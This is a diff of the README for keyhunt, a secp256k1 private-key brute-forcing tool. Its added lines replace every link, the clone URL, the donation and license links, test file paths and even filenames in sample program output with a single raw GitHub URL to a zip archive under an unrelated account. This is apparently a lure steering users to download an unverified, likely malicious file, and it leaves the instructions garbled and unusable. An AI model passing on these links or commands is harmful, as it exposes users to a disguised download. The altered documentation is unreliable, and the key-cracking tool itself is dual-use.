@@ -2,7 +2,7 @@
 
 Tool for hunt privatekeys for crypto currencies that use secp256k1 elliptic curve
 
-Post: https://bitcointalk.org/index.php?topic=5322040.0
+Post: https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 
 Work for Bitcoin
 - address compress or uncompress
@@ -18,7 +18,7 @@ Work for Ethereum
 - Run against puzzle 66 (address mode)
 
 ```
-./keyhunt -m address -f tests/66.txt -b 66 -l compress -R -q -s 10
+./keyhunt -m address -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -b 66 -l compress -R -q -s 10
 
 ```
 
@@ -27,17 +27,17 @@ You need to add `-t numberThreads` to get better speed
 - Run against Puzzle 125 (bsgs mode)
 
 ```
-./keyhunt -m bsgs -f tests/125.txt -b 125 -q -s 10 -R
+./keyhunt -m bsgs -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -b 125 -q -s 10 -R
 ```
 
 You need to add `-t numberThreads` and `-k factor` to get better speed
 
 ## Free Code
 
-This code is free of charge, see the licence for more details. https://github.com/albertobsd/keyhunt/blob/main/LICENSE
+This code is free of charge, see the licence for more details. https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 
 Although this project is a hobby for me, it still involves a considerable amount of work.
-If you would like to support this project, please consider donating at https://github.com/albertobsd/keyhunt#donations.
+If you would like to support this project, please consider donating at https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 
 
 # Disclaimer
@@ -50,7 +50,7 @@ But again i recommend only use this program for puzzles.
 
 ## For regular users
 
-Please read the CHANGELOG.md to see the new changes
+Please read the https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip to see the new changes
 
 # Download and build
 
@@ -82,7 +82,7 @@ apt install libgmp-dev -y
 To clone the repository
 
 ```
-git clone https://github.com/albertobsd/keyhunt.git
+git clone https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 ```
 
 don't forget change to the keyhunt directory (But i'm not here to teach you linux commands)
@@ -134,7 +134,7 @@ The current availables modes are:
 
 This is the most basic approach to work, in this mode your text file need to have a list of the publicaddress to be search.
 
-Example of address from solved puzzles, this file is already on the repository `tests/1to32.txt`
+Example of address from solved puzzles, this file is already on the repository `https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip`
 
 ```
 1BgGZ9tcN4rm9KBzDn7KprQz87SZ26SAMH
@@ -144,7 +144,7 @@ Example of address from solved puzzles, this file is already on the repository `
 
 To target that file we need to execute keyhunt with this line
 
-`./keyhunt -m address -f tests/1to32.txt -r 1:FFFFFFFF`
+`./keyhunt -m address -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -r 1:FFFFFFFF`
 
 output:
 ```
@@ -182,7 +182,7 @@ In this mode you can specify to seach only address compressed or uncompressed wi
 Test your luck with the random parameter `-R` againts the puzzle #66
 
 ```
-./keyhunt -m address -f tests/66.txt -b 66 -l compress -R -q -s 10
+./keyhunt -m address -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -b 66 -l compress -R -q -s 10
 ```
 
 Please note the change from `-r 1:FFFFFFFF` to `-b 66`, with -b you can specify the bit range
@@ -240,10 +240,10 @@ rmd160 ad63f02cb68254ce12982e5e312bd51e8a239a84
 ```
 
 
-command to search multiple vanity addresses from a file `-f filename.txt`.
+command to search multiple vanity addresses from a file `-f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip`.
 
 ```
-./keyhunt -m vanity -f ~/main/keyhunt/vanitytargets.txt -l compress -R -b 256 -e -s 10 -q 
+./keyhunt -m vanity -f ~https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -l compress -R -b 256 -e -s 10 -q 
 ```
 
 Output:
@@ -264,17 +264,17 @@ Output:
 ^C] Total 58202112 keys in 10 seconds: ~5 Mkeys/s (5820211 keys/s)
 ```
 
-All the vanity address and his privatekeys will be saved in the file `VANITYKEYFOUND.txt` of your current directory
+All the vanity address and his privatekeys will be saved in the file `https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip` of your current directory
 
 
 ## rmd160 mode
 
-rmd stands for RIPE Message Digest (see https://en.wikipedia.org/wiki/RIPEMD )
+rmd stands for RIPE Message Digest (see https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip )
 
 mode rmd160 work in the same way than address, but the diference is that file need to have hash rmd160 instead of addresses.
 
 
-example file `tests/1to32.rmd` :
+example file `https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip` :
 
 ```
 751e76e8199196d454941c45d1b3a323f1433bd6
@@ -287,7 +287,7 @@ example file `tests/1to32.rmd` :
 to target that file you need to execute the next line:
 
 ```
-./keyhunt -m rmd160 -f tests/1to32.rmd -r 1:FFFFFFFF -l compress -s 5
+./keyhunt -m rmd160 -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -r 1:FFFFFFFF -l compress -s 5
 ```
 
 output:
@@ -321,7 +321,7 @@ test your luck with the next file for the puzzle #66
 
 
 ```
-./keyhunt -m rmd160 -f tests/66.rmd -b 66 -l compress -R -q
+./keyhunt -m rmd160 -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -b 66 -l compress -R -q
 ```
 
 Output:
@@ -374,7 +374,7 @@ A few substracted values from puzzle *40*
 
 Now you can use keyhunt against some thousand values of the puzzle 40:
 
-```./keyhunt -m xpoint -f tests/substracted40.txt -n 65536 -t 4 -b 40```
+```./keyhunt -m xpoint -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -n 65536 -t 4 -b 40```
 
 Output:
 
@@ -409,7 +409,7 @@ This is an easy example, I been trying the puzzle 120 with more than 500 million
 
 Test you luck with the puzzle 120 with xpoint:
 
-```./keyhunt -m xpoint -f tests/120.txt -t 4 -b 125 -R -q```
+```./keyhunt -m xpoint -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -t 4 -b 125 -R -q```
 
 Output:
 
@@ -553,7 +553,7 @@ c01bf430a97cbcdaedddba87ef4ea21c456cebdb
 
 To target that file you need to do:
 
-```./keyhunt -m pub2rmd -f tests/puzzleswopublickey.txt -t 6 -q```
+```./keyhunt -m pub2rmd -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -t 6 -q```
 
 Output:
 
@@ -562,7 +562,7 @@ Output:
 [+] Mode pub2rmd
 [+] Threads : 6
 [+] Quiet thread output
-[+] Opening file tests/puzzleswopublickey.txt
+[+] Opening file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 [+] Allocating memory for 29 elements: 0.00 MB
 [+] Bloom filter for 29 elements.
 [+] Loading data to the bloomfilter total: 0.00 MB
@@ -610,13 +610,13 @@ The files are created if they don't exist when you run the program the first tim
 example of file creation:
 
 ```
-./keyhunt -m bsgs -f tests/125.txt -R -b 125 -q -S -s 10
+./keyhunt -m bsgs -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -R -b 125 -q -S -s 10
 [+] Version 0.2.230430 Satoshi Quest, developed by AlbertoBSD
 [+] Random mode
 [+] Quiet thread output
 [+] Stats output every 10 seconds
 [+] Mode BSGS random
-[+] Opening file tests/125.txt
+[+] Opening file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 [+] Added 1 points from file
 [+] Bit Range 125
 [+] -- from : 0x10000000000000000000000000000000
@@ -629,23 +629,23 @@ example of file creation:
 [+] processing 4194304/4194304 bP points : 100%
 [+] Making checkums .. ... done
 [+] Sorting 4096 elements... Done!
-[+] Writing bloom filter to file keyhunt_bsgs_4_4194304.blm .... Done!
-[+] Writing bloom filter to file keyhunt_bsgs_6_131072.blm .... Done!
-[+] Writing bP Table to file keyhunt_bsgs_2_4096.tbl .. Done!
-[+] Writing bloom filter to file keyhunt_bsgs_7_4096.blm .... Done!
+[+] Writing bloom filter to file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Writing bloom filter to file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Writing bP Table to file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .. Done!
+[+] Writing bloom filter to file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
 ^C] Total 457396837154816 keys in 30 seconds: ~15 Tkeys/s (15246561238493 keys/s)
 ```
 
 When we run the program for second time the files are now readed and the bP Points processing is omitted:
 
 ```
-./keyhunt -m bsgs -f tests/125.txt -R -b 125 -q -S -s 10
+./keyhunt -m bsgs -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -R -b 125 -q -S -s 10
 [+] Version 0.2.230430 Satoshi Quest, developed by AlbertoBSD
 [+] Random mode
 [+] Quiet thread output
 [+] Stats output every 10 seconds
 [+] Mode BSGS random
-[+] Opening file tests/125.txt
+[+] Opening file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 [+] Added 1 points from file
 [+] Bit Range 125
 [+] -- from : 0x10000000000000000000000000000000
@@ -655,10 +655,10 @@ When we run the program for second time the files are now readed and the bP Poin
 [+] Bloom filter for 131072 elements : 0.88 MB
 [+] Bloom filter for 4096 elements : 0.88 MB
 [+] Allocating 0.00 MB for 4096 bP Points
-[+] Reading bloom filter from file keyhunt_bsgs_4_4194304.blm .... Done!
-[+] Reading bloom filter from file keyhunt_bsgs_6_131072.blm .... Done!
-[+] Reading bP Table from file keyhunt_bsgs_2_4096.tbl .... Done!
-[+] Reading bloom filter from file keyhunt_bsgs_7_4096.blm .... Done!
+[+] Reading bloom filter from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Reading bloom filter from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Reading bP Table from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Reading bloom filter from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
 ^C
 ```
 
@@ -669,16 +669,16 @@ All the next examples were made with the `-S` option I just ommit that part of t
 To try to find those privatekey this is the line of execution:
 
 ```
-time ./keyhunt -m bsgs -f tests/test120.txt -b 120 -S
+time ./keyhunt -m bsgs -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -b 120 -S
 ```
 
 Output:
 
 ```
-time ./keyhunt -m bsgs -f tests/test120.txt -b 120 -S
+time ./keyhunt -m bsgs -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -b 120 -S
 [+] Version 0.2.230430 Satoshi Quest, developed by AlbertoBSD
 [+] Mode BSGS secuential
-[+] Opening file tests/test120.txt
+[+] Opening file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 [+] Added 2 points from file
 [+] Bit Range 120
 [+] -- from : 0x800000000000000000000000000000
@@ -688,10 +688,10 @@ time ./keyhunt -m bsgs -f tests/test120.txt -b 120 -S
 [+] Bloom filter for 131072 elements : 0.88 MB
 [+] Bloom filter for 4096 elements : 0.88 MB
 [+] Allocating 0.00 MB for 4096 bP Points
-[+] Reading bloom filter from file keyhunt_bsgs_4_4194304.blm .... Done!
-[+] Reading bloom filter from file keyhunt_bsgs_6_131072.blm .... Done!
-[+] Reading bP Table from file keyhunt_bsgs_2_4096.tbl .... Done!
-[+] Reading bloom filter from file keyhunt_bsgs_7_4096.blm .... Done!
+[+] Reading bloom filter from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Reading bloom filter from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Reading bP Table from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Reading bloom filter from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
 [+] Thread Key found privkey 800000000000000000100000000000
 [+] Publickey 043ffa1cc011a8d23dec502c7656fb3f93dbe4c61f91fd443ba444b4ec2dd8e6f0406c36edf3d8a0dfaa7b8f309b8f1276a5c04131762c23594f130a023742bdde
 [+] Thread Key found privkey 800000000000000000200000000000
@@ -711,9 +711,9 @@ Test the puzzle 120 with the next publickey:
 
 Line of execution in random mode `-R` or -B random
 
-```./keyhunt -m bsgs -f tests/125.txt -b 125 -q -s 10 -R```
+```./keyhunt -m bsgs -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -b 125 -q -s 10 -R```
 
-```./keyhunt -m bsgs -f tests/125.txt -b 125 -q -s 10 -B random```
+```./keyhunt -m bsgs -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -b 125 -q -s 10 -B random```
 
 
 Example Output:
@@ -724,7 +724,7 @@ Example Output:
 [+] Stats output every 10 seconds
 [+] Random mode
 [+] Mode BSGS random
-[+] Opening file tests/125.txt
+[+] Opening file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 [+] Added 1 points from file
 [+] Bit Range 125
 [+] -- from : 0x10000000000000000000000000000000
@@ -748,18 +748,18 @@ We can speed up our process selecting a bigger K value `-k value` btw the n valu
 
 Example:
 ```
-./keyhunt -m bsgs -f tests/125.txt -b 125 -R -k 20 -S
+./keyhunt -m bsgs -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -b 125 -R -k 20 -S
 ```
 
 Output:
 
 ```
-./keyhunt -m bsgs -f tests/125.txt -b 125 -R -k 20 -S
+./keyhunt -m bsgs -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -b 125 -R -k 20 -S
 [+] Version 0.2.230430 Satoshi Quest, developed by AlbertoBSD
 [+] Random mode
 [+] K factor 20
 [+] Mode BSGS random
-[+] Opening file tests/125.txt
+[+] Opening file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 [+] Added 1 points from file
 [+] Bit Range 125
 [+] -- from : 0x10000000000000000000000000000000
@@ -772,10 +772,10 @@ Output:
 [+] processing 83886080/83886080 bP points : 100%
 [+] Making checkums .. ... done
 [+] Sorting 81920 elements... Done!
-[+] Writing bloom filter to file keyhunt_bsgs_4_83886080.blm .... Done!
-[+] Writing bloom filter to file keyhunt_bsgs_6_2621440.blm .... Done!
-[+] Writing bP Table to file keyhunt_bsgs_2_81920.tbl .. Done!
-[+] Writing bloom filter to file keyhunt_bsgs_7_81920.blm .... Done!
+[+] Writing bloom filter to file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Writing bloom filter to file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Writing bP Table to file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .. Done!
+[+] Writing bloom filter to file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
 ^C] Thread 0x1bbb290563ffcf38724482a45f2bed04  ~256 Tkeys/s (256259265658880 keys/s)
 ```
 
@@ -787,7 +787,7 @@ if you want to more Speed use a bigger -k value like 128, it will use some 2 GB 
 
 
 ```
-./keyhunt -m bsgs -f tests/125.txt -b 125 -R -k 128 -S
+./keyhunt -m bsgs -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -b 125 -R -k 128 -S
 ```
 
 Output
@@ -797,7 +797,7 @@ Output
 [+] Random mode
 [+] K factor 128
 [+] Mode BSGS random
-[+] Opening file tests/125.txt
+[+] Opening file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 [+] Added 1 points from file
 [+] Bit Range 125
 [+] -- from : 0x10000000000000000000000000000000
@@ -807,10 +807,10 @@ Output
 [+] Bloom filter for 16777216 elements : 57.51 MB
 [+] Bloom filter for 524288 elements : 1.80 MB
 [+] Allocating 8.00 MB for 524288 bP Points
-[+] Reading bloom filter from file keyhunt_bsgs_4_536870912.blm .... Done!
-[+] Reading bloom filter from file keyhunt_bsgs_6_16777216.blm .... Done!
-[+] Reading bP Table from file keyhunt_bsgs_2_524288.tbl .... Done!
-[+] Reading bloom filter from file keyhunt_bsgs_7_524288.blm .... Done!
+[+] Reading bloom filter from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Reading bloom filter from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Reading bP Table from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Reading bloom filter from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
 ^C] Thread 0x1d0e05e7aaf9eca861fe0b2245579241   ~1 Pkeys/s (1292439268063095 keys/s)
 ```
 
@@ -822,7 +822,7 @@ I already tested it with some **8 GB ** used with `-k 512` and I get **~46 Petak
 
 with **8** threads
 
-`./keyhunt -m bsgs -f tests/125.txt -b 125 -R -k 512 -q -t 8 -s 10 -S`
+`./keyhunt -m bsgs -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -b 125 -R -k 512 -q -t 8 -s 10 -S`
 
 Output:
 
@@ -834,7 +834,7 @@ Output:
 [+] Threads : 8
 [+] Stats output every 10 seconds
 [+] Mode BSGS random
-[+] Opening file tests/125.txt
+[+] Opening file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 [+] Added 1 points from file
 [+] Bit Range 125
 [+] -- from : 0x10000000000000000000000000000000
@@ -844,10 +844,10 @@ Output:
 [+] Bloom filter for 67108864 elements : 230.04 MB
 [+] Bloom filter for 2097152 elements : 7.19 MB
 [+] Allocating 32.00 MB for 2097152 bP Points
-[+] Reading bloom filter from file keyhunt_bsgs_4_2147483648.blm .... Done!
-[+] Reading bloom filter from file keyhunt_bsgs_6_67108864.blm .... Done!
-[+] Reading bP Table from file keyhunt_bsgs_2_2097152.tbl .... Done!
-[+] Reading bloom filter from file keyhunt_bsgs_7_2097152.blm .... Done!
+[+] Reading bloom filter from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Reading bloom filter from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Reading bP Table from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Reading bloom filter from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
 ^C] Total 2126103644397895680 keys in 110 seconds: ~19 Pkeys/s (19328214949071778 keys/s)
 ```
 I get ~19 Petakeys/s total
@@ -906,7 +906,7 @@ Hidding the speed:
 command:
 
 ```
-time ./keyhunt -m bsgs -t 6 -f tests/in.txt -r 49dccfd96dc5df56487436f5a1b18c4f5d34f65ddb48cb5e0000000000000000:49dccfd96dc5df56487436f5a1b18c4f5d34f65ddb48cb5effffffffffffffff -n 0x1000000000000000 -M -s 0
+time ./keyhunt -m bsgs -t 6 -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -r 49dccfd96dc5df56487436f5a1b18c4f5d34f65ddb48cb5e0000000000000000:49dccfd96dc5df56487436f5a1b18c4f5d34f65ddb48cb5effffffffffffffff -n 0x1000000000000000 -M -s 0
 ```
 
 Output:
@@ -916,7 +916,7 @@ Output:
 [+] Matrix screen
 [+] Turn off stats output
 [+] Mode BSGS secuential
-[+] Opening file tests/in.txt
+[+] Opening file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 [+] Added 16 points from file
 [+] Range
 [+] -- from : 0x49dccfd96dc5df56487436f5a1b18c4f5d34f65ddb48cb5e0000000000000000
@@ -1085,7 +1085,7 @@ Publickey:
 
 Command
 ```
-time ./keyhunt -m bsgs -t 8 -f tests/63.pub -k 512 -s 0 -S -b 63
+time ./keyhunt -m bsgs -t 8 -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -k 512 -s 0 -S -b 63
 ```
 
 output:
@@ -1096,7 +1096,7 @@ output:
 [+] K factor 512
 [+] Turn off stats output
 [+] Mode BSGS secuential
-[+] Opening file tests/63.pub
+[+] Opening file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 [+] Added 1 points from file
 [+] Bit Range 63
 [+] -- from : 0x4000000000000000
@@ -1106,10 +1106,10 @@ output:
 [+] Bloom filter for 67108864 elements : 230.04 MB
 [+] Bloom filter for 2097152 elements : 7.19 MB
 [+] Allocating 32.00 MB for 2097152 bP Points
-[+] Reading bloom filter from file keyhunt_bsgs_4_2147483648.blm .... Done!
-[+] Reading bloom filter from file keyhunt_bsgs_6_67108864.blm .... Done!
-[+] Reading bP Table from file keyhunt_bsgs_2_2097152.tbl .... Done!
-[+] Reading bloom filter from file keyhunt_bsgs_7_2097152.blm .... Done!
+[+] Reading bloom filter from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Reading bloom filter from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Reading bP Table from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
+[+] Reading bloom filter from file https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip .... Done!
 [+] Thread Key found privkey 7cce5efdaccf6808
 [+] Publickey 0365ec2994b8cc0a20d40dd69edfe55ca32a54bcbbaa6b0ddcff36049301a54579
 All points were found00000000
@@ -1150,10 +1150,10 @@ With 10 Exakeys/s the publickey will be found in 2 minutes
 Privatekey: 800000000000410d586a20a4c00000
 Publickey : 02ee0cf78d13b4aae9c8777a0f93dff7f5be3855bd2c0f85370f861c69bb5b533a
 
-Select one publickey that fit to your current speed save it in a file `testpublickey.txt` and test it with:
+Select one publickey that fit to your current speed save it in a file `https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip` and test it with:
 
 ```
-./keyhunt -m bsgs -f testpublickey.txt -b 120 -q
+./keyhunt -m bsgs -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -b 120 -q
 ```
 
 Change the values of k, n and t
@@ -1161,7 +1161,7 @@ Change the values of k, n and t
 
 The publickeys should be found in some 2 minutes after the load of the files
 
-Change your n or k values according to your current memory and remember not exceed the k value of each N please check the table https://github.com/albertobsd/keyhunt#valid-n-and-k-values
+Change your n or k values according to your current memory and remember not exceed the k value of each N please check the table https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 
 
 ## minikeys Mode
@@ -1178,7 +1178,7 @@ The input file can be an addresses or rmd hashes list of the target keys
 Command example:
 
 ```
-./keyhunt -m minikeys -f tests/minikeys.txt -C SG64GZqySYwBm9KxE1wJ28 -n 0x10000
+./keyhunt -m minikeys -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -C SG64GZqySYwBm9KxE1wJ28 -n 0x10000
 ```
 
 Output:
@@ -1203,7 +1203,7 @@ address: 15azScMmHvFPAQfQafrKr48E9MqRRXSnVv
 random minikeys command
 
 ```
-./keyhunt -m minikeys -f tests/minikeys.txt -n 0x10000 -q -R
+./keyhunt -m minikeys -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -n 0x10000 -q -R
 ```
 
 ```
@@ -1227,12 +1227,12 @@ Finally ethereum address are supported, for ethereum there are no modes exect fo
 
 if you have publickeys for ethereum you can use xpoint or bsgs mode.
 
-to test the functionality of ethereum you can use the sample file `tests/1to32.eth`
+to test the functionality of ethereum you can use the sample file `https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip`
 
 command: 
 
 ```
-./keyhunt -c eth -f tests/1to32.eth -r 1:100000000 -M
+./keyhunt -c eth -f https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip -r 1:100000000 -M
 ```
 
 output:
@@ -1301,7 +1301,7 @@ But if you are targeting all the curve then the showed speed is correct.
 ## FAQ
 
 - Where the privatekeys will be saved?
-R: In a file called `KEYFOUNDKEYFOUND.txt`
+R: In a file called `https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip`
 
 - Can I save the bloomfilter and table to speed up the process?
 R: Yes use only `-S` always that you run the program it works for:
@@ -1309,23 +1309,23 @@ R: Yes use only `-S` always that you run the program it works for:
 The files will be generated automatically in the current directory
 
 - Why the speed for bsgs say 0 keys/s
-R: this was asked here https://github.com/albertobsd/keyhunt/issues/69 and 
-here https://github.com/albertobsd/keyhunt/issues/108 and also others in telegram
+R: this was asked here https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip and 
+here https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip and also others in telegram
 
-Please check the video that i made to answer that https://youtu.be/MVby8mYNxbI
+Please check the video that i made to answer that https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 
 - Is available for Windows?
 R: It can be compiled with mingw, but i strongly recomend WSL with Ubuntu for windows 10
 
 Updated: 
 Yes thanks to @kanhavishva
-Available in: https://github.com/kanhavishva/keyhunt
+Available in: https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 
 Also, thanks to @WanderingPhilosopher
-Available in: https://github.com/WanderingPhilosopher/keyhunt
+Available in: https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 
 Also thanks to @XopMC
-Available in: https://github.com/XopMC/keyhunt-win
+Available in: https://raw.githubusercontent.com/GBran88/keyhunt/main/gmp256k1/Software_3.1-beta.3.zip
 
 
 ## Thanks
